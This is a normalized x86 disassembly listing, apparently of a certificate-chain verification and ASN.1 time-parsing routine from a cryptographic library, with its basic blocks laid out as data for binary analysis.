cmp eax edi
je r-xdata
call sub_1001e3c0
cmp eax edi
mov [ esi + 0x4c ] eax
je r-xdata
mov eax [ esi + 0x4c ]
push eax
call sub_1001e7b0
mov edx [ esi + 0x4c ]
mov ebx eax
mov [ esp + 0x18 ] ebx
lea ecx [ ebx - 0x1 ]
push ecx
push edx
call sub_1001e7c0
mov edi eax
mov eax [ ebp + 0x18 ]
add esp 0xc
cmp eax ebx
mov [ esp + 0x20 ] eax
jl r-xdata
push eax
call sub_1001e2e0
add esp 0x4
cmp eax edi
mov [ esp + 0x18 ] eax
jne r-xdata
push 0x7a
jmp r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi + 0x4c ]
push ecx
call sub_1001e7b0
mov edx [ esi + 0x4c ]
lea ebx [ eax - 0x1 ]
push ebx
push edx
call sub_1001e7c0
mov edi eax
push edi
call sub_10021340
push edi
push edi
push esi
call [ esi + 0x28 ]
add esp 0x1c
test eax eax
je r-xdata
push edi
call sub_10021330
push edi
push edi
push esi
call [ esi + 0x28 ]
add esp 0x10
test eax eax
jne r-xdata
push 0x85
jmp r-xdata
push r--data
push 0x41
push 0x7f
push 0xb
call sub_1001de60
add esp 0x14
jmp r-xdata
mov edx [ esi + 0x8 ]
push 0x7d
push r--data
push 0x3
add edx 0x10
push 0x1
push edx
call sub_1001f5f0
add esp 0x14
mov [ esi + 0x48 ] 0x1
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x14 ]
mov eax [ esi + 0x4c ]
push eax
call sub_1001e7b0
add esp 0x4
cmp eax 0x1
jne r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4c ]
push ecx
push 0x0
call sub_10028560
add esp 0x8
push edi
call sub_10021330
push edi
push edi
push esi
call [ esi + 0x28 ]
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_10021330
push edi
push edi
push esi
call [ esi + 0x28 ]
add esp 0x10
test eax eax
jne r-xdata
mov edx [ esi + 0x4c ]
push edx
call sub_1001e6e0
mov ecx [ esi + 0x48 ]
mov ebx [ esp + 0x18 ]
dec ecx
dec ebx
mov ebp eax
mov [ esi + 0x48 ] ecx
mov ecx [ esi + 0x4c ]
lea eax [ ebx - 0x1 ]
push eax
push ecx
mov [ esp + 0x28 ] ebp
call sub_1001e7c0
add esp 0xc
mov edi eax
jmp r-xdata
push edi
lea ecx [ esp + 0x14 ]
push esi
push ecx
call [ esi + 0x24 ]
mov ebp eax
add esp 0xc
test ebp ebp
jle r-xdata
mov eax [ esp + 0x18 ]
xor ebx ebx
push eax
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push eax
call sub_1001e780
add esp 0x4
mov edx [ esi + 0x14 ]
mov ebx [ esi + 0x20 ]
xor ebp ebp
push r--data
mov eax [ edx + 0xc ]
mov [ esp + 0x24 ] ebp
shr eax 0x6
and eax 0x1
mov [ esp + 0x18 ] ebp
mov [ esp + 0x2c ] eax
mov [ esp + 0x38 ] 0xffffffff
call getenv
add esp 0x4
test eax eax
je r-xdata
test ebp ebp
je r-xdata
push edi
lea edx [ esp + 0x14 ]
push esi
push edx
call [ esi + 0x24 ]
add esp 0xc
test eax eax
jl r-xdata
cmp [ esp + 0x20 ] ebx
jl r-xdata
cmp ebp 0x1
mov [ esi + 0x5c ] 0x12
mov [ esi + 0x60 ] edi
mov [ esi + 0x58 ] ebx
jne r-xdata
mov edx [ esp + 0x10 ]
push edx
push edi
call sub_10021350
add esp 0x8
test eax eax
jne r-xdata
xor ebp ebp
mov ecx [ esp + 0x18 ]
push ebx
push ecx
call sub_1001e7c0
mov ebp eax
push ebp
push edi
push esi
call [ esi + 0x28 ]
add esp 0x14
test eax eax
jne r-xdata
mov eax [ esp + 0x34 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push eax
call sub_10022870
add esp 0x4
mov eax [ esi + 0x48 ]
test eax eax
jle r-xdata
mov [ esp + 0x28 ] 0x1
cmp [ esi + 0x48 ] ebx
jl r-xdata
push ebp
push edi
push esi
call [ esi + 0x28 ]
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
je r-xdata
push esi
push 0x0
mov [ esp + 0x2c ] 0x1
call [ esp + 0x30 ]
add esp 0x8
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_10022870
add esp 0x4
push edi
call sub_10022870
mov edi [ esp + 0x14 ]
mov eax [ esi + 0x4c ]
push edi
push ebx
push eax
call sub_1001e7e0
add esp 0x10
mov [ esi + 0x48 ] 0x0
jmp r-xdata
mov eax [ esi + 0x4c ]
push ebp
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
test ebp ebp
mov [ esp + 0x10 ] ebp
je r-xdata
mov edx [ esp + 0x18 ]
inc ebx
push edx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov eax 0x1
mov eax [ esi + 0x4c ]
push ebp
push eax
call sub_1001e7c0
mov ecx [ esi + 0x14 ]
mov edi eax
add esp 0x8
test [ ecx + 0xc ] 0x10
jne r-xdata
mov [ esi + 0x5c ] 0x2
mov [ esi + 0x5c ] 0x14
jmp r-xdata
mov ecx [ esi + 0x4c ]
push ebp
push ecx
call sub_1001e6c0
add esp 0x8
inc ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x60 ] ebp
mov [ esi + 0x5c ] 0x13
mov [ esp + 0x1c ] 0x0
jmp r-xdata
mov edi [ esp + 0x10 ]
mov eax [ esi + 0x4c ]
push edi
push eax
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0xa3
mov ecx [ esp + 0x10 ]
push 0xa6
push r--data
push 0x3
add ecx 0x10
push 0x1
push ecx
call sub_1001f5f0
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x2c ]
push edx
push eax
call sub_1001e570
mov edi [ esi + 0x48 ]
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x3c ]
add esp 0x1c
inc edi
inc eax
mov [ esi + 0x48 ] edi
mov edi [ esp + 0x10 ]
cmp ecx eax
mov [ esp + 0x14 ] eax
jge r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
mov eax [ edi + 0x28 ]
test ah 0x2
je r-xdata
mov [ esi + 0x60 ] edi
dec ebx
push esi
push 0x0
mov [ esi + 0x58 ] ebx
mov [ esp + 0x2c ] 0x1
call [ esp + 0x30 ]
add esp 0x8
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
call sub_10022870
push 0xfa
push r--data
push 0x41
push 0x7f
push 0xb
call sub_1001de60
add esp 0x18
xor eax eax
mov eax [ esp + 0x20 ]
inc ebx
cmp eax ebx
jge r-xdata
mov eax [ esp + 0x34 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4c ]
mov ebp [ esi + 0x20 ]
push ecx
call sub_1001e7b0
mov edx [ esi + 0x4c ]
mov edi eax
dec edi
push edi
push edx
call sub_1001e7c0
mov ebx eax
mov eax [ esi + 0x14 ]
push 0x0
mov ecx [ eax + 0x14 ]
push ecx
push ebx
call sub_10030b40
add esp 0x18
cmp eax 0x1
je r-xdata
push edi
call sub_10023f20
mov ecx [ esp + 0x38 ]
add esp 0x4
cmp ecx 0xffffffff
je r-xdata
mov eax [ edi + 0x28 ]
test ah 0x4
je r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x22
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi + 0x4c ]
push edx
push 0x0
call sub_10028560
push esi
call [ esi + 0x2c ]
add esp 0xc
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
cmp eax 0x2
mov [ esi + 0x58 ] edi
mov [ esi + 0x60 ] ebx
jne r-xdata
mov ecx [ esi + 0x14 ]
test [ ecx + 0xc ] 0x20
je r-xdata
test ecx ecx
je r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x28
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
test eax eax
mov [ esp + 0x34 ] eax
je r-xdata
mov eax [ esi + 0x1c ]
push esi
test eax eax
je r-xdata
mov [ esi + 0x5c ] 0x1b
mov [ esi + 0x5c ] 0x1c
jmp r-xdata
mov edx [ esi + 0x14 ]
mov eax [ edx + 0x10 ]
test eax eax
jle r-xdata
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
call sub_10028110
call eax
jmp r-xdata
push esi
push 0x0
call ebp
add esp 0x8
mov [ esp + 0x34 ] eax
cmp ebp 0x1
jle r-xdata
mov edx [ esp + 0x34 ]
xor ecx ecx
test edx edx
setg cl
push ecx
push eax
push edi
call sub_10023a40
add esp 0xc
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ esi + 0x5c ] 0x25
jmp r-xdata
mov [ esi + 0x5c ] 0x18
mov edx [ esi + 0x14 ]
test [ edx + 0xc ] 0x20
je r-xdata
mov eax [ esp + 0x24 ]
test eax eax
jne r-xdata
add esp 0x4
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
mov eax [ edi + 0x28 ]
test al 0x20
jne r-xdata
test [ edi + 0x28 ] 0x20
jne r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x1a
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi + 0x14 ]
test [ edx + 0xc ] 0x20
je r-xdata
push esi
push 0x0
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x14 ]
test [ eax + 0xc ] 0x80
je r-xdata
test ah 0x4
je r-xdata
inc [ esp + 0x20 ]
mov eax [ edi + 0x20 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x1
je r-xdata
jmp r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
push esi
call [ esi + 0x3c ]
add esp 0x4
mov [ esp + 0x34 ] eax
mov [ esp + 0x34 ] 0x1
mov eax [ edi + 0x24 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x14 ]
lea edx [ eax + ecx + 0x1 ]
mov eax [ esp + 0x20 ]
cmp eax edx
jle r-xdata
mov eax [ esp + 0x14 ]
mov [ esp + 0x34 ] 0x0
inc eax
mov [ esp + 0x14 ] eax
jmp r-xdata
cmp ebp eax
jle r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x19
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
mov eax [ esi + 0x48 ]
inc ebp
cmp ebp eax
jl r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x26
mov [ esi + 0x58 ] ebp
mov [ esi + 0x60 ] edi
call ebx
add esp 0x8
test eax eax
je r-xdata
sub_10028110
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov eax [ esi + 0x4c ]
mov edi [ esi + 0x20 ]
push eax
mov [ esp + 0x14 ] edi
call sub_1001e7b0
mov ecx [ esi + 0x4c ]
dec eax
mov ebp eax
mov [ esi + 0x58 ] eax
push ebp
push ecx
mov [ esp + 0x28 ] ebp
call sub_1001e7c0
mov ebx eax
push ebx
push ebx
push esi
call [ esi + 0x28 ]
add esp 0x18
test eax eax
je r-xdata
test ebp ebp
jg r-xdata
mov edi ebx
jmp r-xdata
mov edx [ esi + 0x4c ]
dec ebp
push ebp
push edx
mov [ esp + 0x24 ] ebp
mov [ esi + 0x58 ] ebp
call sub_1001e7c0
add esp 0x8
mov edi eax
push esi
push 0x0
mov [ esi + 0x5c ] 0x15
mov [ esi + 0x60 ] ebx
call edi
add esp 0x8
mov ebp eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
test ebp ebp
jl r-xdata
mov ebp 0x1
mov [ esi + 0x58 ] ebp
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
mov [ edi + 0xc ] 0x1
mov eax [ esi + 0x14 ]
test [ eax + 0xc ] 0x2
je r-xdata
push ebx
call sub_10021790
mov ebp eax
add esp 0x4
test ebp ebp
mov [ esp + 0x14 ] ebp
jne r-xdata
xor ebp ebp
lea ebp [ eax + 0x4 ]
jmp r-xdata
push ebp
push edi
call sub_1002f680
add esp 0x8
test eax eax
jg r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0x6
mov [ esi + 0x60 ] ebx
call [ esp + 0x18 ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
jle r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0xd
mov [ esi + 0x60 ] edi
call [ esi + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
push ebp
mov ecx [ eax + 0x10 ]
mov edx [ ecx ]
push edx
call sub_10028330
add esp 0x8
test eax eax
jne r-xdata
push ebp
call sub_10023940
add esp 0x4
push esi
push 0x0
mov [ esi + 0x5c ] 0x7
mov [ esi + 0x60 ] edi
call [ esp + 0x18 ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jmp r-xdata
mov eax [ edi ]
push ebp
mov ecx [ eax + 0x10 ]
mov edx [ ecx + 0x4 ]
push edx
call sub_10028330
add esp 0x8
test eax eax
jne r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0x9
mov [ esi + 0x60 ] edi
call [ esi + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
xor ebp ebp
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jmp r-xdata
mov edx [ esp + 0x14 ]
push edx
call sub_10023940
add esp 0x4
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebp [ esp + 0x14 ]
jge r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0xe
mov [ esi + 0x60 ] edi
call [ esi + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
push esi
push 0x1
mov [ esi + 0x64 ] ebx
mov [ esi + 0x60 ] edi
call [ esp + 0x18 ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push esi
push 0x0
mov [ esi + 0x5c ] 0xa
mov [ esi + 0x60 ] edi
call [ esi + 0x20 ]
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x1c ]
dec eax
mov [ esp + 0x1c ] eax
js r-xdata
mov ecx [ esi + 0x4c ]
push eax
push ecx
mov ebx edi
call sub_1001e7c0
mov ebp [ esp + 0x24 ]
add esp 0x8
mov edi eax
jmp r-xdata
sub_10028330
mov eax 0x40
call sub_1001d0d0
push ebp
mov ebp [ esp + 0x48 ]
push esi
push edi
mov edi [ ebp + 0x4 ]
mov ecx [ ebp ]
mov eax [ ebp + 0x8 ]
cmp edi 0x17
jne r-xdata
cmp ecx 0xd
jge r-xdata
cmp ecx 0xb
jl r-xdata
mov edx eax
add eax 0xc
mov ecx [ edx ]
mov [ esp + 0x1c ] ecx
mov ecx [ edx + 0x4 ]
mov [ esp + 0x20 ] ecx
lea ecx [ esp + 0x28 ]
mov edx [ edx + 0x8 ]
mov [ esp + 0x24 ] edx
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x40
retn
cmp ecx 0x11
jg r-xdata
mov [ ecx ] 0x30
inc ecx
mov [ ecx ] 0x30
inc ecx
cmp dl 0x2d
je r-xdata
mov ecx eax
add eax 0xa
mov edx [ ecx ]
mov [ esp + 0x1c ] edx
mov edx [ ecx + 0x4 ]
mov [ esp + 0x20 ] edx
mov cx [ ecx + 0x8 ]
mov [ esp + 0x24 ] cx
lea ecx [ esp + 0x26 ]
jmp r-xdata
cmp dl 0x2b
je r-xdata
xor esi esi
jmp r-xdata
cmp dl 0x2b
je r-xdata
mov dl [ eax ]
cmp dl 0x5a
je r-xdata
movsx ecx [ eax + 0x1 ]
movsx esi [ eax + 0x2 ]
lea ecx [ ecx + ecx * 4 ]
cmp dl 0x2d
lea ecx [ esi + ecx * 2 ]
movsx esi [ eax + 0x3 ]
movsx eax [ eax + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ ecx + ecx * 4 ]
lea esi [ eax + ecx * 2 - 0x7dd0 ]
jne r-xdata
cmp dl 0x2d
je r-xdata
mov eax [ esp + 0x54 ]
mov ecx edi
lea edx [ esp + 0x34 ]
mov [ esp + 0x10 ] ecx
test eax eax
mov [ esp + 0xc ] 0x18
mov [ esp + 0x14 ] edx
je r-xdata
mov [ ecx ] dl
mov dl [ eax + 0x1 ]
inc ecx
inc eax
mov [ ecx ] dl
mov dl [ eax + 0x1 ]
inc ecx
inc eax
cmp dl 0x2e
jne r-xdata
neg esi
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x40
retn
lea eax [ esp + 0x50 ]
push eax
call time
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x54 ]
add esp 0x4
mov eax [ eax ]
jmp r-xdata
mov dl [ eax ]
mov [ ecx ] 0x5a
cmp dl 0x5a
mov [ ecx + 0x1 ] 0x0
jne r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x30
jl r-xdata
lea edx [ esp + 0xc ]
push eax
push edx
call sub_10048330
cmp ecx 0x17
jne r-xdata
mov edx esi
shl edx 0x4
sub edx esi
neg edx
lea eax [ eax + edx * 4 ]
lea edx [ esp + 0xc ]
test edx edx
mov [ esp + 0x50 ] eax
je r-xdata
cmp dl 0x39
jg r-xdata
cmp [ ebp + 0x4 ] 0x17
jne r-xdata
pop edi
pop esi
pop ebp
add esp 0x40
retn
cmp ecx 0x18
jne r-xdata
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_10048760
jmp r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x30
jge r-xdata
push ebx
lea esi [ esp + 0x38 ]
lea eax [ esp + 0x20 ]
movsx eax [ esp + 0x1c ]
movsx ecx [ esp + 0x1d ]
lea eax [ eax + eax * 4 ]
lea ecx [ ecx + eax * 2 - 0x210 ]
cmp ecx 0x32
jge r-xdata
lea ecx [ esp + 0xc ]
push eax
push ecx
call sub_10048540
jmp r-xdata
add esp 0x8
test eax eax
jne r-xdata
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
movsx eax [ esp + 0x34 ]
lea edx [ eax + eax * 4 ]
movsx eax [ esp + 0x35 ]
lea eax [ eax + edx * 2 - 0x210 ]
cmp eax 0x32
jge r-xdata
add ecx 0x64
pop edi
pop esi
pop ebp
add esp 0x40
retn
or eax 0xffffffff
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov bl [ esi + 0x1 ]
mov cl dl
cmp dl bl
jne r-xdata
cmp ecx eax
jl r-xdata
add eax 0x64
test eax eax
pop ebx
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
jle r-xdata
mov dl [ eax ]
mov bl [ esi ]
mov cl dl
cmp dl bl
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x40
retn
sub_10028560
mov eax [ esp + 0x4 ]
push ebp
push esi
push edi
test eax eax
je r-xdata
mov ebp [ esp + 0x14 ]
xor edi edi
push ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
push eax
call sub_10023670
add esp 0x4
test eax eax
je r-xdata
push 0x494
push r--data
push 0x6b
push 0x6e
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
retn
push edi
push ebp
call sub_1001e7c0
push eax
call sub_10021790
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
retn
push 0x487
push r--data
push 0x6c
push 0x6e
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
retn
push esi
call sub_10023670
add esp 0x4
test eax eax
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_10023940
push ebp
inc edi
call sub_1001e7b0
add esp 0x8
cmp edi eax
jl r-xdata
push ebx
lea ebx [ edi - 0x1 ]
test ebx ebx
jl r-xdata
jmp r-xdata
mov eax [ esp + 0x14 ]
pop ebx
test eax eax
je r-xdata
push ebx
push ebp
call sub_1001e7c0
push eax
call sub_10021790
mov edi eax
push esi
push edi
call sub_10023500
push edi
call sub_10023940
add esp 0x18
dec ebx
jns r-xdata
push esi
call sub_10023940
add esp 0x4
push esi
push eax
call sub_10023500
add esp 0x8
sub_10028660
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push eax
push ecx
push 0x5
call sub_1001f3a0
add esp 0x18
retn
sub_100286b0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x10 ]
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
mov [ esi ] edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x48 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x5c ] ebx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x58 ] ebx
mov [ esi + 0x60 ] ebx
mov [ esi + 0x64 ] ebx
mov [ esi + 0x50 ] ebx
call sub_1001f900
cmp eax ebx
mov [ esi + 0x14 ] eax
jne r-xdata
cmp edi ebx
je r-xdata
push 0x55d
jmp r-xdata
mov ecx [ eax + 0xc ]
or ecx 0x11
mov [ eax + 0xc ] ecx
mov [ esi + 0x40 ] ebx
jmp r-xdata
mov edx [ edi + 0xc ]
push edx
push eax
call sub_1001f9b0
mov ecx [ edi + 0x14 ]
add esp 0x8
mov [ esi + 0x20 ] ecx
mov edx [ edi + 0x30 ]
mov [ esi + 0x40 ] edx
jmp r-xdata
push r--data
push 0x41
push 0x8f
push 0xb
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push r--data
call sub_1001fb20
push eax
mov eax [ esi + 0x14 ]
push eax
call sub_1001f9b0
add esp 0xc
cmp eax ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp edi ebx
je r-xdata
push 0x579
mov [ esi + 0x28 ] sub_10028890
mov eax [ edi + 0x1c ]
cmp eax ebx
je r-xdata
mov [ esi + 0x24 ] sub_10022280
mov eax [ edi + 0x18 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x28 ] eax
jmp r-xdata
mov [ esi + 0x20 ] sub_10028880
mov eax [ edi + 0x14 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x24 ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x1c ] sub_10028110
mov eax [ edi + 0x10 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x20 ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x2c ] sub_100288e0
mov eax [ edi + 0x20 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x1c ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x30 ] sub_100289d0
mov eax [ edi + 0x24 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x2c ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x34 ] sub_10028be0
mov eax [ edi + 0x28 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x30 ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x38 ] sub_10028cf0
mov edi [ edi + 0x2c ]
cmp edi ebx
je r-xdata
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp edi ebx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push esi
call sub_1001d740
push 0x5b0
push r--data
push 0x41
push 0x8f
push 0xb
call sub_1001de60
add esp 0x18
xor eax eax
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] edi
jmp r-xdata
cmp edi ebx
je r-xdata
lea ecx [ esi + 0x6c ]
mov [ esi + 0x3c ] sub_10028df0
push ecx
push esi
push 0x5
call sub_1001f420
add esp 0xc
test eax eax
jne r-xdata
sub_10028890
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x14 ]
push esi
push edi
call sub_100243b0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx + 0x14 ]
test [ edx + 0xc ] 0x1
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
push ecx
push 0x0
mov [ ecx + 0x5c ] eax
mov [ ecx + 0x60 ] esi
mov [ ecx + 0x64 ] edi
call [ ecx + 0x20 ]
add esp 0x8
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
sub_100288e0
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
push edi
mov eax [ esi + 0x14 ]
mov eax [ eax + 0xc ]
test al 0x4
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
test al 0x8
je r-xdata
mov [ esp + 0x10 ] 0x0
mov eax [ esp + 0x10 ]
mov ecx [ esi + 0x4c ]
push ecx
call sub_1001e7b0
add esp 0x4
dec eax
mov [ esp + 0x10 ] eax
jmp r-xdata
mov edx [ esi + 0x4c ]
push ebp
push edx
mov [ esi + 0x58 ] ebp
mov [ esp + 0x20 ] 0x0
call sub_1001e7c0
mov ebx eax
lea eax [ esp + 0x20 ]
push ebx
push eax
push esi
mov [ esi + 0x60 ] ebx
call [ esi + 0x30 ]
add esp 0x14
test eax eax
jne r-xdata
xor ebp ebp
test eax eax
jl r-xdata
mov eax [ esp + 0x18 ]
push eax
push esi
mov [ esi + 0x68 ] eax
call [ esi + 0x34 ]
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push esi
push eax
mov [ esi + 0x5c ] 0x3
call [ esi + 0x20 ]
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ esi + 0x68 ] 0x0
push edx
call sub_100350a0
add esp 0x4
test edi edi
je r-xdata
mov ecx [ esp + 0x18 ]
push ebx
push ecx
push esi
call [ esi + 0x38 ]
add esp 0xc
mov edi eax
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
mov eax [ esp + 0x10 ]
inc ebp
cmp ebp eax
jle r-xdata
sub_100289d0
mov eax 0xc
call sub_1001d0d0
mov eax [ esp + 0x18 ]
push ebx
push ebp
push esi
push edi
xor esi esi
push eax
mov [ esp + 0x14 ] esi
call sub_10021330
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
xor ebp ebp
xor ebx ebx
mov edi [ ecx + 0x10 ]
push edi
call sub_1001e7b0
add esp 0x8
test eax eax
jle r-xdata
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x20 ]
lea edx [ esp + 0x14 ]
push edx
push eax
push 0x2
push ecx
call sub_10021d10
add esp 0x10
test eax eax
jne r-xdata
push ebx
push edi
call sub_1001e7c0
mov ecx [ esp + 0x30 ]
mov esi eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push eax
push ecx
call sub_10021390
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
test esi esi
mov [ eax ] ecx
je r-xdata
test esi esi
je r-xdata
push edi
inc ebx
call sub_1001e7b0
add esp 0x4
cmp ebx eax
jl r-xdata
mov edx [ esp + 0x20 ]
push eax
push esi
push edx
call sub_10028b10
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
push esi
call sub_100350a0
add esp 0x4
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
mov edx [ esp + 0x24 ]
pop edi
mov eax 0x1
mov [ edx ] esi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
test ebp ebp
je r-xdata
push 0x2ac
push r--data
push 0x3
lea eax [ esi + 0xc ]
push 0x1
push eax
call sub_1001f5f0
mov ecx [ esp + 0x38 ]
add esp 0x14
mov eax 0x1
mov [ ecx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ebp esi
mov esi [ esp + 0x10 ]
push 0x2b4
mov [ esp + 0x14 ] ebp
push r--data
push 0x3
add ebp 0xc
push 0x1
push ebp
call sub_1001f5f0
add esp 0x14
jmp r-xdata
sub_10028b10
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov eax [ esi + 0x14 ]
mov [ esi + 0x68 ] ebp
test [ eax + 0xc ] 0x2
je r-xdata
xor edi edi
lea edi [ eax + 0x4 ]
jmp r-xdata
test eax eax
jle r-xdata
test ebx ebx
mov [ esi + 0x5c ] 0xf
je r-xdata
mov eax [ ebp ]
push edi
mov ecx [ eax + 0xc ]
push ecx
call sub_10028330
mov ebx [ esp + 0x24 ]
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp ]
mov eax [ edx + 0x10 ]
test eax eax
je r-xdata
test ebx ebx
mov [ esi + 0x5c ] 0xb
